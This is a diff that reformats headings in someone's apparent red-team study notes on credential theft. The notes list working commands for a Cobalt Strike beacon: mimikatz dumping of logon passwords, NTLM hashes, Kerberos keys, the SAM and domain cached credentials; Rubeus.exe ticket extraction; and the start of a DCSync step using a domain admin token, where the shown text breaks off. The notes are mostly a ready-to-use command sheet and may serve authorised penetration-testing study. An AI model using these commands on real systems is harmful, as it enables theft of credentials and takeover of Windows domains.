@@ -1,6 +1,6 @@
 # Credential Theft Notes
 
-**Beacon + Mimikatz**
+## Beacon + Mimikatz
 
 Can run mimikatz in beacon
 ```
@@ -18,32 +18,32 @@ Can use ! to elevate as SYSTEM
 mimikatz !lsadump::sam
 ```
 
-**NTLM Hashes**
+## NTLM Hashes
 
 We can dump possible plaintext passwords with mimikatz sekurlsa::logonpasswords
 ```
 mimikatz !sekurlsa::logonpasswords
 ```
 
-**Kerberos Encryption Keys**
+## Kerberos Encryption Keys
 Dumps kerberos encryption keys of logged on users
 ```
 mimikatz !sekurlsa::ekeys
 ```
 
-**Security Account manager**
+## Security Account manager
 
 ```
 mimikatz !lsadump::sam
 ```
 
-**Domain Cached Credentials**
+## Domain Cached Credentials
 dumps any domain creds saved on the machine
 ```
 mimikatz !lsadump::cache
 ```
 
-**Extracting Kerberos Tickets**
+## Extracting Kerberos Tickets
 
 ```
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
@@ -54,7 +54,7 @@ Pulling with Rubeus for a specific user TGT
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x7049f /service:krbtgt
 ```
 
-**DCSYNC**
+## DCSYNC
 a fun one, using a token of a domain admin user
 ```
 make_token DOMAIN\User <password>
